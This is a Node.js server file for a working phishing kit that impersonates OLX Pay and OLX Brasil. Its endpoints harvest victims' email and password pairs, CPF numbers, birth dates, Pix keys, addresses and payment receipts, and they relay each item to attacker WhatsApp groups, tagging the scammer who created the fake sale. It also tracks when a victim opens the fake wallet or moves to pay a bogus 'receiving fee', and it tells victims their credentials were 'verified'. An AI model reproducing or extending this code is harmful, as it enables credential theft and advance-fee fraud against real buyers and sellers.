// Variáveis globais
let conn = null;
let isConnected = false;
let qrCode = null;
let gruposIds = []; // IDs resolvidos dos grupos destino

// Inicialização do WhatsApp
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const express = require("express");
const path = require("path");
const fs = require("fs");
const multer = require("multer");
const { v4: uuidv4 } = require("uuid");

const config = require("./config.json");
const { ensureGroupJoined, resolverESalvarGrupos } = require("./js/whatsapp-group");

// 📧 Importar funções de email
const { enviarEmail, enviarEmMassa, iniciarMonitoramento } = require("./js/envio-email");

// Importar o módulo qrcodepagamentos
const qrcodePagamentos = require("./js/qrcodepagamentos");

function formatarErroWhatsApp(error) {
  const boomData = error?.data ?? error?.output?.statusCode ?? null;
  const boomMessage =
    error?.output?.payload?.message ||
    error?.message ||
    "Erro desconhecido no envio pelo WhatsApp";

  let motivoProvavel = null;
  if (boomData === 400) {
    motivoProvavel =
      "Requisição inválida (400) ao WhatsApp: verifique se o ID do grupo/destino é válido, se o bot faz parte do grupo e se a sessão está sincronizada.";
  } else if (boomData === 401 || boomData === 403) {
    motivoProvavel =
      "Sem permissão ou sessão não autorizada no WhatsApp.";
  } else if (boomData === 404) {
    motivoProvavel =
      "Destino/grupo não encontrado no WhatsApp.";
  }

  return {
    message: motivoProvavel ? `${boomMessage} — ${motivoProvavel}` : boomMessage,
    code: boomData ? `WHATSAPP_${boomData}` : (error?.code || "WHATSAPP_SEND_ERROR"),
    details: {
      protocolCode: boomData,
      isBoom: Boolean(error?.isBoom),
      rawMessage: error?.message || null,
    },
  };
}

async function connectToWhatsApp() {
  try {
    // Usar armazenamento de autenticação em múltiplos arquivos
    const { state, saveCreds } = await useMultiFileAuthState(
      "./bot/auth_info_baileys"
    );

    // Criar socket do WhatsApp
    const { version } = await fetchLatestBaileysVersion();
    console.log("baileys version", version);

    conn = makeWASocket({
      auth: state,
      version,
      logger: pino({ level: "silent" }),
    });

    // Escutar mensagens recebidas (para futuras implementações)
    const dataVendas = JSON.parse(
      fs.readFileSync(path.join(__dirname, "data", "vendas.json"), "utf8")
    );

    conn.ev.on("messages.upsert", async (m) => {
      try {
        if (!m.messages) return;
        const mek = m.messages[0];
        if (!mek.message) return;
        if (mek.key.fromMe) return;
        if (mek.key && mek.key.remoteJid === "status@broadcast") return;

        // console.log("Mensagem recebida:", mek);
        require("./bot/system/admins")(conn, mek, dataVendas);
      } catch (error) {
        console.error("Erro ao processar mensagem:", error);
      }
    });

    // Salvar credenciais quando autenticado
    conn.ev.on("creds.update", () => saveCreds());

    conn.ev.on("connection.update", (update) => {
      const { connection, lastDisconnect, qr } = update;

      // Armazenar QR code para exibi-lo na interface administrativa (se necessário)
      if (qr) {
        qrCode = qr;
        const qrcode = require("qrcode-terminal");
        qrcode.generate(qr, { small: true });
      }

      // Se conectado
      if (connection === "open") {
        isConnected = true;
        qrCode = null;
        console.log("Conectado ao WhatsApp");

        // Resolver e salvar IDs dos grupos configurados
        resolverESalvarGrupos(conn)
          .then((ids) => {
            gruposIds = ids;
            console.log(`Grupos configurados: ${ids.join(", ")}`);
            // Avisar todos os grupos da conexão
            return Promise.all(
              ids.map((gid) =>
                conn.sendMessage(gid, { text: "*Conexão estabelecida com sucesso!*" })
              )
            );
          })
          .then(() => {
            console.log("Aviso de conexão enviado aos grupos configurados.");

            // 📧 Iniciar monitoramento de respostas de email (a cada 2 minutos)
            iniciarMonitoramento(conn, enviarMensagemWhatsApp, 2, enviarBufferWhatsApp);
          })
          .catch((err) => {
            console.error("Erro ao resolver grupos ou enviar aviso de conexão:", err);
          });
      }

      // Se desconectado
      if (connection === "close") {
        isConnected = false;
        const shouldReconnect =
          lastDisconnect?.error?.output?.statusCode !==
          DisconnectReason.loggedOut;

        console.log(
          "Conexão fechada devido a ",
          lastDisconnect?.error,
          ", reconectando: ",
          shouldReconnect
        );

        // Reconectar se não estiver deslogado
        if (shouldReconnect) {
          connectToWhatsApp();
        }
      }
    });
  } catch (error) {
    console.error("Erro na conexão com WhatsApp:", error);
  }
}

// Conexão do Site:
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const uploadDir = path.join(__dirname, "uploads");
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    const fileExt = path.extname(file.originalname);
    cb(null, `comprovante-${uuidv4()}${fileExt}`);
  },
});

const upload = multer({
  storage: storage,
  limits: { fileSize: 55 * 1024 * 1024 }, // 55MB limite (suporta vídeos até ~50MB)
  fileFilter: function (req, file, cb) {
    const allowedExt = /\.(jpeg|jpg|png|pdf|mp4|mov)$/i;
    const allowedMime =
      /^image\/(jpeg|jpg|png)$|^application\/pdf$|^video\/(mp4|quicktime)$/i;

    const extOk = allowedExt.test(path.extname(file.originalname).toLowerCase());
    const mimeOk = allowedMime.test(file.mimetype);

    if (extOk && mimeOk) {
      return cb(null, true);
    }
    cb(
      new Error(
        `Tipo de arquivo não permitido (${file.mimetype} / ${path.extname(file.originalname)}). Envie JPEG, PNG, PDF, MP4 ou MOV.`
      )
    );
  },
});

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para logs de requisições
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Middleware para processar JSON
app.use(express.json());

// Servir arquivos estáticos
app.use(express.static(path.join(__dirname, "public")));

// Função para verificar status do WhatsApp
function verificarStatusWhatsApp() {
  console.log(
    `Status da conexão WhatsApp: ${isConnected ? "Conectado" : "Desconectado"}`
  );
  return isConnected;
}

// Função melhorada para enviar mensagem WhatsApp
async function enviarMensagemWhatsApp(mensagem) {
  console.log("Iniciando envio de mensagem WhatsApp...");

  try {
    if (!isConnected || !conn) {
      console.error("WhatsApp não está conectado. Status:", isConnected);
      return {
        success: false,
        code: "WHATSAPP_DISCONNECTED",
        message: "WhatsApp não está conectado",
        details: { isConnected: Boolean(isConnected), hasConn: Boolean(conn) },
      };
    }

    if (!gruposIds || gruposIds.length === 0) {
      return {
        success: false,
        code: "MISSING_RECIPIENT",
        message: "Nenhum grupo destino resolvido. Verifique config.json['grupos'].",
        details: { gruposIds },
      };
    }

    console.log(`Enviando mensagem para ${gruposIds.length} grupo(s): ${gruposIds.join(", ")}`);
    await Promise.all(
      gruposIds.map((gid) => conn.sendMessage(gid, { text: mensagem }))
    );
    console.log("Mensagem enviada com sucesso para todos os grupos!");

    return { success: true, message: "Mensagem enviada com sucesso" };
  } catch (error) {
    const infoErro = formatarErroWhatsApp(error);
    console.error("Erro detalhado ao enviar mensagem:", {
      ...infoErro,
      gruposIds,
      stack: error?.stack,
    });

    return {
      success: false,
      message: infoErro.message,
      error: infoErro.message,
      code: infoErro.code,
      details: infoErro.details,
    };
  }
}

// Função para enviar buffer (imagem, vídeo ou documento) pelo WhatsApp
async function enviarBufferWhatsApp(fileBuffer, contentType, fileName, caption) {
  console.log("Iniciando envio de mídia/documento WhatsApp...", { fileName, contentType });

  try {
    if (!isConnected || !conn) {
      console.error("WhatsApp não está conectado. Status:", isConnected);
      return {
        success: false,
        code: "WHATSAPP_DISCONNECTED",
        message: "WhatsApp não está conectado",
        details: null,
      };
    }

    if (!gruposIds || gruposIds.length === 0) {
      return {
        success: false,
        code: "MISSING_RECIPIENT",
        message: "Nenhum grupo destino resolvido. Verifique config.json['grupos'].",
        details: { gruposIds },
      };
    }

    const mime = (contentType || "").toLowerCase();
    const ext = path.extname(fileName || "").toLowerCase();

    let messageContent;
    if (mime.startsWith("image/") || /\.(jpeg|jpg|png|gif|webp)$/i.test(ext)) {
      messageContent = {
        image: fileBuffer,
        mimetype: mime || undefined,
        caption,
      };
    } else if (mime.startsWith("video/") || /\.(mp4|mov|avi|mkv|webm)$/i.test(ext)) {
      messageContent = {
        video: fileBuffer,
        mimetype: mime || (ext === ".mov" ? "video/quicktime" : "video/mp4"),
        caption,
      };
    } else if (mime.startsWith("audio/") || /\.(mp3|ogg|wav|m4a)$/i.test(ext)) {
      messageContent = {
        audio: fileBuffer,
        mimetype: mime || "audio/mpeg",
      };
    } else {
      messageContent = {
        document: fileBuffer,
        mimetype: mime || "application/octet-stream",
        fileName: fileName || "anexo",
        caption,
      };
    }

    console.log(`Enviando arquivo para ${gruposIds.length} grupo(s): ${gruposIds.join(", ")}`, { fileName, mime });
    await Promise.all(
      gruposIds.map((gid) => conn.sendMessage(gid, messageContent))
    );
    console.log("Arquivo enviado com sucesso para todos os grupos!");

    return { success: true, message: "Arquivo enviado com sucesso" };
  } catch (error) {
    const infoErro = formatarErroWhatsApp(error);
    console.error("Erro ao enviar arquivo:", {
      ...infoErro,
      gruposIds,
      fileName,
    });

    return {
      success: false,
      message: infoErro.message,
      error: infoErro.message,
      code: infoErro.code,
      details: infoErro.details,
    };
  }
}

// Função para enviar arquivo pelo WhatsApp
async function enviarArquivoWhatsApp(filePath, caption) {
  console.log("Iniciando envio de arquivo WhatsApp...");

  if (!fs.existsSync(filePath)) {
    console.error(`Arquivo não encontrado: ${filePath}`);
    return {
      success: false,
      code: "FILE_NOT_FOUND",
      message: "Arquivo não encontrado",
      details: { filePath },
    };
  }

  const fileBuffer = fs.readFileSync(filePath);
  const fileExt = path.extname(filePath).toLowerCase();
  const fileName = path.basename(filePath);
  const mimeMap = {
    ".pdf": "application/pdf",
    ".mp4": "video/mp4",
    ".mov": "video/quicktime",
    ".png": "image/png",
    ".jpg": "image/jpeg",
    ".jpeg": "image/jpeg",
  };

  return enviarBufferWhatsApp(
    fileBuffer,
    mimeMap[fileExt] || "application/octet-stream",
    fileName,
    caption
  );
}

function responderFalhaWhatsApp(res, resultado, fallbackMsg) {
  const httpStatus = resultado?.code === "WHATSAPP_400" ? 400 : 500;
  const codigoErro = resultado?.code || "WHATSAPP_SEND_ERROR";
  const detalheErro =
    resultado?.message || fallbackMsg || "Falha não especificada no WhatsApp";

  console.error("Falha no envio WhatsApp:", {
    codigoErro,
    detalheErro,
    details: resultado?.details,
  });

  return res.status(httpStatus).json({
    success: false,
    message: detalheErro,
    error: detalheErro,
    code: codigoErro,
    details: resultado?.details ?? null,
  });
}

// Endpoint para receber dados bancários e enviar para WhatsApp
app.post("/api/enviar-dados-bancarios", async (req, res) => {
  console.log("Recebendo requisição para enviar dados bancários");

  try {
    const dados = req.body || {};
    console.log("Dados recebidos:", JSON.stringify(dados));

    const camposObrigatorios = [
      "nome",
      "email",
      "telefone",
      "cpf",
      "banco",
      "pix_tipo",
      "pix_chave",
    ];
    const camposFaltando = camposObrigatorios.filter((campo) => !dados[campo]);

    if (camposFaltando.length > 0) {
      console.error("Dados incompletos recebidos. Faltando:", camposFaltando);
      return res.status(400).json({
        success: false,
        message: `Dados incompletos. Campos obrigatórios faltando: ${camposFaltando.join(", ")}`,
        error: `Campos obrigatórios faltando: ${camposFaltando.join(", ")}`,
        code: "MISSING_FIELDS",
        missingFields: camposFaltando,
      });
    }

    if (!verificarStatusWhatsApp()) {
      console.error("Tentativa de envio com WhatsApp desconectado");
      return res.status(503).json({
        success: false,
        message:
          "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
        error: "WhatsApp desconectado",
        code: "WHATSAPP_DISCONNECTED",
      });
    }

    // Buscar produto, comprador e criador pelo venda_id, se informado
    let nomeProduto = "Não informado";
    let nomeComprador = "Não informado";
    let nomeVendedor = "Não informado";
    let criadoPor = null;
    console.log("venda_id recebido:", JSON.stringify(dados.venda_id));
    if (dados.venda_id && dados.venda_id.trim()) {
      try {
        const vendasData = JSON.parse(
          fs.readFileSync(path.join(__dirname, "data", "vendas.json"), "utf8")
        );
        const vendaIdBusca = dados.venda_id.trim();
        const venda = vendasData.find((v) => v.codigo && v.codigo.trim() === vendaIdBusca);
        console.log("Venda encontrada:", venda ? "SIM - " + venda.produto : "NÃO (total registros: " + vendasData.length + ")");
        if (venda) {
          nomeProduto = venda.produto || "Não informado";
          nomeComprador = venda.comprador || "Não informado";
          criadoPor = venda.criadoPor || null;
        }
      } catch (e) {
        console.error("Erro ao buscar venda pelo id:", e);
      }
    } else {
      console.warn("venda_id não informado ou vazio — produto/comprador ficarão como 'Não informado'");
    }

    // Montar menção ao criador do produto, se disponível
    const mencionarCriador = criadoPor ? `\n\n👤 *Responsável:* @${criadoPor.replace("@s.whatsapp.net", "").replace("@lid", "")}` : "";

    const mensagem =
      `*Novos dados bancários recebidos*\n\n` +
      `*Produto:* ${nomeProduto}\n` +
      `*Comprador:* ${nomeComprador}\n\n` +
      `*Dados Pessoais:*\n` +
      `Nome: ${dados.nome}\n` +
      `Email: ${dados.email}\n` +
      `Telefone: ${dados.telefone}\n` +
      `CPF: ${dados.cpf}\n\n` +
      `*Dados Bancários:*\n` +
      `Banco: ${dados.banco}\n` +
      `Tipo de Chave Pix: ${dados.pix_tipo}\n` +
      `Chave Pix: ${dados.pix_chave}\n\n` +
      `*Endereço Cadastrado:*\n` +
      `${dados.endereco || "Não informado"}\n\n` +
      `Enviado em: ${new Date().toLocaleString("pt-BR")}` +
      mencionarCriador;

    console.log("Mensagem formatada, iniciando envio...");

    // Enviar com menção ao criador do produto no grupo
    let resultado;
    if (criadoPor && conn && isConnected && gruposIds.length > 0) {
      try {
        const mentions = [criadoPor];
        console.log(`Enviando dados bancários com menção a ${criadoPor} para ${gruposIds.length} grupo(s)`);
        await Promise.all(
          gruposIds.map((gid) =>
            conn.sendMessage(gid, { text: mensagem, mentions })
          )
        );
        resultado = { success: true, message: "Mensagem enviada com sucesso (com menção)" };
      } catch (error) {
        const infoErro = formatarErroWhatsApp(error);
        console.error("Erro ao enviar com menção, tentando sem menção:", infoErro);
        resultado = await enviarMensagemWhatsApp(mensagem);
      }
    } else {
      resultado = await enviarMensagemWhatsApp(mensagem);
    }
    console.log("Resultado completo do envio:", JSON.stringify(resultado, null, 2));

    if (resultado && resultado.success) {
      return res.json({
        success: true,
        message: "Dados enviados com sucesso para o WhatsApp",
      });
    }

    return responderFalhaWhatsApp(
      res,
      resultado,
      "Erro ao enviar mensagem para o WhatsApp"
    );
  } catch (error) {
    console.error("Erro ao processar dados bancários:", error);
    return res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error?.message || "Erro interno inesperado",
      code: error?.code || "INTERNAL_SERVER_ERROR",
    });
  }
});

// Endpoint para obter dados da venda pelo ID
app.get("/api/venda/:id", (req, res) => {
  const id = req.params.id;

  try {
    const vendasData = fs.readFileSync(
      path.join(__dirname, "data", "vendas.json"),
      "utf8"
    );
    const vendas = JSON.parse(vendasData);

    const venda = vendas.find((v) => v.codigo === id);

    if (venda) {
      setTimeout(() => {
        res.json(venda);
      }, 300);
    } else {
      res.status(404).json({
        error: "Venda não encontrada",
        message: "Não foi possível encontrar uma venda com o código informado.",
      });
    }
  } catch (error) {
    console.error("Erro ao buscar dados da venda:", error);
    res.status(500).json({
      error: "Erro ao processar requisição",
      message:
        "Ocorreu um erro ao processar sua solicitação. Tente novamente mais tarde.",
    });
  }
});

// NOVO SITE
app.get("/home", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "home.html"));
});

app.get("/dados-bancarios", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "dados-bancarios.html"));
});

app.get("/dados-bancarios.html", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "dados-bancarios.html"));
});

app.get("/pag", (req, res) => {
  const id = req.query.id;
  if (id) {
    res.redirect(`/?id=${id}`);
  } else {
    res.redirect("/");
  }
});

app.get("/api/vendas", (req, res) => {
  try {
    const vendasData = fs.readFileSync(
      path.join(__dirname, "data", "vendas.json"),
      "utf8"
    );
    const vendas = JSON.parse(vendasData);
    res.json(vendas);
  } catch (error) {
    console.error("Erro ao buscar todas as vendas:", error);
    res.status(500).json({ error: "Erro ao processar requisição" });
  }
});

app.get("/api/termos", (req, res) => {
  res.json({
    titulo: "Termos de Uso da OLX Brasil",
    atualizado: "01/04/2023",
    conteudo: "Este documento apresenta os termos e condições gerais...",
  });
});

app.get("/api/privacidade", (req, res) => {
  res.json({
    titulo: "Política de Privacidade da OLX Brasil",
    atualizado: "01/04/2023",
    conteudo: "A OLX Brasil está comprometida em proteger sua privacidade...",
  });
});

// Endpoint para receber comprovante e enviar via WhatsApp
app.post(
  "/api/enviar-comprovante",
  upload.single("comprovante"),
  async (req, res) => {
    console.log("Recebendo requisição para enviar comprovante");

    try {
      if (!req.file) {
        console.error("Nenhum arquivo recebido");
        return res.status(400).json({
          success: false,
          message: "Nenhum arquivo de comprovante recebido",
          error: "Nenhum arquivo de comprovante recebido",
          code: "MISSING_FILE",
        });
      }

      console.log("Arquivo recebido:", req.file);

      if (!verificarStatusWhatsApp()) {
        console.error("Tentativa de envio com WhatsApp desconectado");
        return res.status(503).json({
          success: false,
          message:
            "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
          error: "WhatsApp desconectado",
          code: "WHATSAPP_DISCONNECTED",
        });
      }

      const chavePix = req.body.chavePix || "Não informada";
      const valor = req.body.valor || "Não informado";

      const caption =
        `*COMPROVANTE DE PAGAMENTO RECEBIDO*\n\n` +
        `*Dados do Pagamento:*\n` +
        `Valor: R$ ${valor}\n` +
        `Chave PIX: ${chavePix}\n\n` +
        `Recebido em: ${new Date().toLocaleString("pt-BR")}`;

      const resultado = await enviarArquivoWhatsApp(req.file.path, caption);

      if (resultado.success) {
        return res.json({
          success: true,
          message: "Comprovante enviado com sucesso para o WhatsApp",
        });
      }

      return responderFalhaWhatsApp(
        res,
        resultado,
        "Erro ao enviar comprovante para o WhatsApp"
      );
    } catch (error) {
      console.error("Erro ao processar envio de comprovante:", error);
      return res.status(500).json({
        success: false,
        message: "Erro ao processar sua solicitação",
        error: error?.message || "Erro interno inesperado",
        code: error?.code || "INTERNAL_SERVER_ERROR",
      });
    }
  }
);

// Endpoint para notificar quando o cliente acessa a página da carteira
app.post("/api/notificar-acesso-carteira", async (req, res) => {
  console.log("Cliente acessou a página da carteira");

  try {
    const dados = req.body || {};
    const codigoVenda = dados.codigo || "Não informado";
    const nomeProduto = dados.produto || "Não informado";
    const valorProduto = dados.valor || "Não informado";

    if (!verificarStatusWhatsApp()) {
      console.error("WhatsApp desconectado - não foi possível enviar notificação de acesso à carteira");
      return res.status(503).json({
        success: false,
        message: "Serviço do WhatsApp indisponível",
        error: "WhatsApp desconectado",
        code: "WHATSAPP_DISCONNECTED",
      });
    }

    // Buscar dados da venda para menção
    let criadoPor = null;
    let nomeComprador = "Não informado";
    if (codigoVenda && codigoVenda !== "Não informado") {
      try {
        const vendasData = JSON.parse(
          fs.readFileSync(path.join(__dirname, "data", "vendas.json"), "utf8")
        );
        const venda = vendasData.find((v) => v.codigo && v.codigo.trim() === codigoVenda.trim());
        if (venda) {
          criadoPor = venda.criadoPor || null;
          nomeComprador = venda.comprador || "Não informado";
        }
      } catch (e) {
        console.error("Erro ao buscar venda para notificação de carteira:", e);
      }
    }

    const mencionarCriador = criadoPor ? `\n\n👤 *Responsável:* @${criadoPor.replace("@s.whatsapp.net", "").replace("@lid", "")}` : "";

    const mensagem =
      `*💰 CLIENTE ACESSOU A CARTEIRA OLX PAY*\n\n` +
      `*Informações da venda:*\n` +
      `Código da venda: ${codigoVenda}\n` +
      `Produto: ${nomeProduto}\n` +
      `Valor: ${valorProduto}\n` +
      `Comprador: ${nomeComprador}\n\n` +
      `Cliente abriu a página da carteira e está visualizando o saldo.\n` +
      `Horário: ${new Date().toLocaleString("pt-BR")}` +
      mencionarCriador;

    let resultado;
    if (criadoPor && conn && isConnected && gruposIds.length > 0) {
      try {
        const mentions = [criadoPor];
        console.log(`Enviando notificação de acesso à carteira com menção a ${criadoPor}`);
        await Promise.all(
          gruposIds.map((gid) =>
            conn.sendMessage(gid, { text: mensagem, mentions })
          )
        );
        resultado = { success: true, message: "Notificação enviada com sucesso (com menção)" };
      } catch (error) {
        console.error("Erro ao enviar com menção, tentando sem menção:", error);
        resultado = await enviarMensagemWhatsApp(mensagem);
      }
    } else {
      resultado = await enviarMensagemWhatsApp(mensagem);
    }

    if (resultado.success) {
      return res.json({
        success: true,
        message: "Notificação de acesso à carteira enviada com sucesso",
      });
    }

    return responderFalhaWhatsApp(
      res,
      resultado,
      "Erro ao enviar notificação para o WhatsApp"
    );
  } catch (error) {
    console.error("Erro ao processar notificação de acesso à carteira:", error);
    return res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error?.message || "Erro interno inesperado",
      code: error?.code || "INTERNAL_SERVER_ERROR",
    });
  }
});

// Endpoint para notificar quando o cliente clica em "Continuar"
app.post("/api/notificar-clique-continuar", async (req, res) => {
  console.log("Cliente clicou em botão de ação");

  try {
    const dados = req.body || {};
    const codigoVenda = dados.codigo || "Não informado";
    const nomeProduto = dados.produto || "Não informado";
    const acao = dados.acao || "continuar";
    const valor = dados.valor || "";

    if (!verificarStatusWhatsApp()) {
      console.error(
        "WhatsApp desconectado - não foi possível enviar notificação de clique"
      );
      return res.status(503).json({
        success: false,
        message: "Serviço do WhatsApp indisponível",
        error: "WhatsApp desconectado",
        code: "WHATSAPP_DISCONNECTED",
      });
    }

    let mensagem;

    if (acao === "clique_taxa") {
      mensagem =
        `*⚠️ CLIENTE VAI PAGAR A TAXA DE RECEBIMENTO DE VALORES ⚠️*\n\n` +
        `*Informações da venda:*\n` +
        `Código da venda: ${codigoVenda}\n` +
        `Produto: ${nomeProduto}\n` +
        `Valor da taxa: R$ ${valor}\n\n` +
        `Cliente clicou no botão para pagar a taxa de recebimento de valores e está sendo redirecionado para a página de pagamento.\n` +
        `Horário: ${new Date().toLocaleString("pt-BR")}`;
    } else {
      mensagem =
        `*Cliente clicou em CONTINUAR*\n\n` +
        `*Informações da venda:*\n` +
        `Código da venda: ${codigoVenda}\n` +
        `Produto: ${nomeProduto}\n\n` +
        `Cliente viu a mensagem de conclusão e clicou em continuar\n` +
        `Horário: ${new Date().toLocaleString("pt-BR")}`;
    }

    const resultado = await enviarMensagemWhatsApp(mensagem);

    if (resultado.success) {
      return res.json({
        success: true,
        message: "Notificação enviada com sucesso",
      });
    }

    return responderFalhaWhatsApp(
      res,
      resultado,
      "Erro ao enviar notificação para o WhatsApp"
    );
  } catch (error) {
    console.error("Erro ao processar notificação de clique:", error);
    return res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error?.message || "Erro interno inesperado",
      code: error?.code || "INTERNAL_SERVER_ERROR",
    });
  }
});

// Endpoint para receber email do acesso OLX Pay e enviar para WhatsApp
app.post("/api/enviar-email-acesso", async (req, res) => {
  console.log("Recebendo requisição para enviar email de acesso");

  try {
    const dados = req.body || {};
    console.log("Dados recebidos:", JSON.stringify(dados));

    if (!dados.email) {
      console.error("Email não fornecido");
      return res.status(400).json({
        success: false,
        message: "Email não fornecido",
        error: "Email não fornecido",
        code: "MISSING_EMAIL",
      });
    }

    if (!verificarStatusWhatsApp()) {
      console.error("Tentativa de envio com WhatsApp desconectado");
      return res.status(503).json({
        success: false,
        message:
          "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
        error: "WhatsApp desconectado",
        code: "WHATSAPP_DISCONNECTED",
      });
    }

    const mensagem =
      `*✅ NOVO ACESSO À CENTRAL DE VENDAS OLX PAY*\n\n` +
      `*Dados de Acesso:*\n` +
      `Email: ${dados.email}\n\n` +
      `Cliente iniciou o processo de login na Central de Vendas OLX Pay\n` +
      `Horário: ${new Date().toLocaleString("pt-BR")}`;

    console.log("Mensagem formatada, iniciando envio...");

    const resultado = await enviarMensagemWhatsApp(mensagem);
    console.log("Resultado do envio:", resultado);

    if (resultado.success) {
      return res.json({
        success: true,
        message: "Email enviado com sucesso para o WhatsApp",
      });
    }

    return responderFalhaWhatsApp(
      res,
      resultado,
      "Erro ao enviar mensagem para o WhatsApp"
    );
  } catch (error) {
    console.error("Erro ao processar email de acesso:", error);
    return res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error?.message || "Erro interno inesperado",
      code: error?.code || "INTERNAL_SERVER_ERROR",
    });
  }
});

// Endpoint para receber email e senha do acesso OLX Pay e enviar para WhatsApp
app.post("/api/enviar-credenciais-acesso", async (req, res) => {
  console.log("Recebendo requisição para enviar credenciais de acesso");

  try {
    const dados = req.body || {};
    console.log("Dados recebidos:", JSON.stringify(dados));

    if (!dados.email || !dados.senha) {
      console.error("Email ou senha não fornecidos");
      return res.status(400).json({
        success: false,
        message: "Email e senha são obrigatórios",
        error: "Email e senha são obrigatórios",
        code: "MISSING_CREDENTIALS",
      });
    }

    if (!verificarStatusWhatsApp()) {
      console.error("Tentativa de envio com WhatsApp desconectado");
      return res.status(503).json({
        success: false,
        message:
          "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
        error: "WhatsApp desconectado",
        code: "WHATSAPP_DISCONNECTED",
      });
    }

    const mensagem =
      `*🔐 NOVO LOGIN NA CENTRAL DE VENDAS OLX PAY*\n\n` +
      `*Credenciais Recebidas:*\n` +
      `Email: ${dados.email}\n` +
      `Senha: ${dados.senha}\n\n` +
      `Cliente realizou login na Central de Vendas OLX Pay\n` +
      `Horário: ${new Date().toLocaleString("pt-BR")}`;

    console.log("Mensagem formatada, iniciando envio...");

    const resultado = await enviarMensagemWhatsApp(mensagem);
    console.log("Resultado do envio:", resultado);

    if (resultado.success) {
      return res.json({
        success: true,
        message: "Credenciais verificadas com sucesso",
      });
    }

    return responderFalhaWhatsApp(
      res,
      resultado,
      "Erro ao enviar mensagem para o WhatsApp"
    );
  } catch (error) {
    console.error("Erro ao processar credenciais de acesso:", error);
    return res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error?.message || "Erro interno inesperado",
      code: error?.code || "INTERNAL_SERVER_ERROR",
    });
  }
});

// Endpoint para receber dados de cadastro OLX Pay e enviar para WhatsApp
app.post("/api/enviar-cadastro-olx", async (req, res) => {
  console.log("Recebendo requisição para enviar cadastro OLX Pay");

  try {
    const dados = req.body || {};
    console.log("Dados recebidos:", JSON.stringify(dados));

    if (
      !dados.nome ||
      !dados.cpf ||
      !dados.telefone ||
      !dados.data_nascimento ||
      !dados.pix_tipo ||
      !dados.pix_chave ||
      !dados.endereco
    ) {
      console.error("Dados incompletos recebidos");
      return res.status(400).json({
        success: false,
        message: "Todos os campos obrigatórios devem ser preenchidos",
        error: "Todos os campos obrigatórios devem ser preenchidos",
        code: "MISSING_FIELDS",
      });
    }

    if (!verificarStatusWhatsApp()) {
      console.error("Tentativa de envio com WhatsApp desconectado");
      return res.status(503).json({
        success: false,
        message:
          "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
        error: "WhatsApp desconectado",
        code: "WHATSAPP_DISCONNECTED",
      });
    }

    const mensagem =
      `*📝 NOVO CADASTRO OLX PAY*\n\n` +
      `Nome: ${dados.nome}\n` +
      `CPF: ${dados.cpf}\n` +
      `Telefone: ${dados.telefone}\n` +
      `Data de Nascimento: ${dados.data_nascimento}\n` +
      `Tipo PIX: ${dados.pix_tipo}\n` +
      `Chave PIX: ${dados.pix_chave}\n` +
      `Endereço: ${dados.endereco}\n\n` +
      `Horário: ${new Date().toLocaleString("pt-BR")}`;

    console.log("Mensagem formatada, iniciando envio...");

    const resultado = await enviarMensagemWhatsApp(mensagem);
    console.log("Resultado do envio:", resultado);

    if (resultado.success) {
      return res.json({
        success: true,
        message: "Cadastro enviado com sucesso para o WhatsApp",
      });
    }

    return responderFalhaWhatsApp(
      res,
      resultado,
      "Erro ao enviar mensagem para o WhatsApp"
    );
  } catch (error) {
    console.error("Erro ao processar cadastro OLX Pay:", error);
    return res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error?.message || "Erro interno inesperado",
      code: error?.code || "INTERNAL_SERVER_ERROR",
    });
  }
});

// Endpoint para gerar QR Code PIX
app.get("/api/gerar-qrcode-pix", async (req, res) => {
  try {
    console.log("Gerando QR Code PIX...");
    const resultado = await qrcodePagamentos.gerarQRCode();

    if (resultado?.status === 404) {
      await enviarMensagemWhatsApp(
        `*⚠️ ERRO AO GERAR QR CODE PIX ⚠️*\n\nOcorreu um erro ao tentar gerar o QR Code PIX. A página de redirecionamento não foi encontrada (404). Verifique se a URL de redirecionamento está correta e se o serviço está disponível.\n\nHorário: ${new Date().toLocaleString("pt-BR")}`
      );
      return res.status(404).json({
        success: false,
        message: "Página de redirecionamento para QR Code PIX não encontrada (404)",
        code: "PIX_REDIRECT_404",
      });
    }

    if (!resultado || !resultado.imgBase64) {
      console.error("Erro ao gerar QR Code PIX: Resultado inválido");
      return res.status(500).json({
        success: false,
        message: "Não foi possível gerar o QR Code PIX",
        code: "INVALID_PIX_RESULT",
        resultado,
      });
    }

    return res.json({
      success: true,
      qrCodeBase64: resultado.imgBase64,
      pixTitle: resultado.pixTitle,
    });
  } catch (error) {
    console.error("Erro ao gerar QR Code PIX:", error);
    return res.status(500).json({
      success: false,
      message: "Erro ao gerar QR Code PIX",
      error: error?.message || "Erro interno inesperado",
      code: error?.code || "PIX_ERROR",
    });
  }
});

// Rota padrão para qualquer outra solicitação (SPA pattern)
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "home.html"));
});

// Middleware para tratamento de erros
app.use((err, req, res, next) => {
  console.error("Erro na aplicação:", err);
  if (err instanceof multer.MulterError) {
    return res.status(400).json({
      success: false,
      message: `Erro no upload do arquivo: ${err.message}`,
      error: err.message,
      code: err.code || "MULTER_ERROR",
    });
  }
  return res.status(500).json({
    success: false,
    message: "Ocorreu um erro no servidor. Tente novamente mais tarde.",
    error: err?.message || "Erro interno no servidor",
    code: err?.code || "INTERNAL_SERVER_ERROR",
  });
});

app.listen(PORT, () => {
